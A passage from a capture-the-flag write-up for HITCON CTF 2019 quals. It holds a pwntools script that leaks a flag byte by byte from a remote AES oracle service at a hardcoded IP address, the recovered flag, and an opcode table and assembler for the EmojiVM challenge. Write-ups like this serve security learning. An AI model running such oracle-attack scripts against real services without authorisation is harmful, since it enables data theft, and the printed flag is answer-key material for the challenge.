xxd didn't clear the original data, we can leak the flag one byte by one byte.

```python
#!/usr/bin/env python3
from pwn import *
import string

context.log_level = 'CRITICAL'

def cmd(x, data = None):
    global r

    while True:
        try:
            r.sendlineafter('0) quit\n', str(x))
            if x == 1 and data:
                r.sendlineafter('Data? (In hex format)\n', data.hex())
            elif x == 2:
                return r.recvline().strip()
            elif x == 3 and data:
                r.sendlineafter('- AES\n', data)
            return
        except EOFError:
            r = remote('13.113.205.160', 21700)
            mode('aes')
            copyflag()

def read():
    return cmd(2)

def write(data):
    cmd(1, data)

def mode(data):
    cmd(3, data)

def copyflag():
    cmd(1337)

r = remote('13.113.205.160', 21700)
mode('aes')
copyflag()

flag = b''

for block in range(2):
    checks = [read()]
    for i in range(1, 16):
        write(b'\x00' * 16 * block + b'\x00' * i)
        checks += [read()]

    leak = b''
    for i in range(15, -1, -1):
        #for j in range(256):
        for j in string.printable:
            write(b'\x00' * 16 * block + b'\x00' * i + bytes([ord(j)]) + leak[::-1])
            if read() == checks[i]:
                leak += bytes([ord(j)])
                print(leak)
                break

    flag += leak[::-1]

print(flag)
```

flag : `hitcon{xxd?XDD!e45dc4df7d0b79}`

### EmojiVM
I created a simple assembler with this reversed opcode table:

```
1  🈳: nop
2  ➕: +
3  ➖: -
4  ❌: *
5  ❓: %
6  ❎: ^
7  👫: &
8  💀: <
9  💯: ==
10 🚀: jmp
11 🈶: jmp if true
12 🈚: jmp if false
13 ⏬: push back
14 🔝: pop top
15 📤: load?
16 📥: store?
17 🆕: malloc (at most 10) [size, malloc(size)]
18 🆓: free
19 📄: read
20 📝: write
21 🔡: write until nullbyte
22 🔢: cout
23 🛑: exit

1 ~ 10
😀😁😂🤣😜😄😅😆😉😊😍
```

```python
import re
import sys


opmap = {
    'nop':   '\U0001f233',
    'add':   '\U00002795',
    'sub':   '\U00002796',
    'mul':   '\U0000274c',
    'mod':   '\U00002753',
    'pow':   '\U0000274e',
    'and':   '\U0001f46b',
    'lt':    '\U0001f480',
    'eq':    '\U0001f4af',
    'jmp':   '\U0001f680',
    'jt':    '\U0001f236',
    'jf':    '\U0001f21a',
    'push':  '\U000023ec',
    'pop':   '\U0001f51d',
    'load':  '\U0001f4e4',
    'store': '\U0001f4e5',
    'alloc': '\U0001f195',
    'free':  '\U0001f193',
    'read':  '\U0001f4c4',
    'write': '\U0001f4dd',
    'puts':  '\U0001f521',
    'puti':  '\U0001f522',
    'exit':  '\U0001f6d1',
}

valmap = [
    '\U0001f600',
    '\U0001f601',
    '\U0001f602',
    '\U0001f923',
    '\U0001f61c',
    '\U0001f604',
    '\U0001f605',
    '\U0001f606',
    '\U0001f609',
    '\U0001f60a',
    '\U0001f60d',
]


def push(n):
    pc = 0
    if n < 0:
        raise NotImplementedError('QAQ')
    if n < 10:
        return opmap['push'] + valmap[int(n)], 2
    ns = list(str(n).strip('L'))
    ret = opmap['push'] + valmap[int(ns.pop(0))]
    pc += 2
    for i in ns:
        ret += opmap['push'] + valmap[10]
        pc += 2
        ret += opmap['mul']
        pc += 1
        ret += opmap['push'] + valmap[int(i)]
        pc += 2
        ret += opmap['add']
        pc += 1
    return ret, pc
    

out = []
with open(sys.argv[1]) as f:
    data = f.read()

data = re.sub(r';[^\n]*', '', data)
data = re.sub(r'[ \t]+', ' ', data)

labels = {}
pc = 0

for line in data.splitlines():
    line = line.strip()
    if line == '':
        continue

    print('debug: ', line)
    if line.endswith(':'):
        labels[line[:-1]] = pc
        continue

    op, *args = line.split(' ')
    if op not in opmap:
        print('Invalid op %s' % op, file=sys.stderr)
```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20191012-hitconctfquals/README.md>*
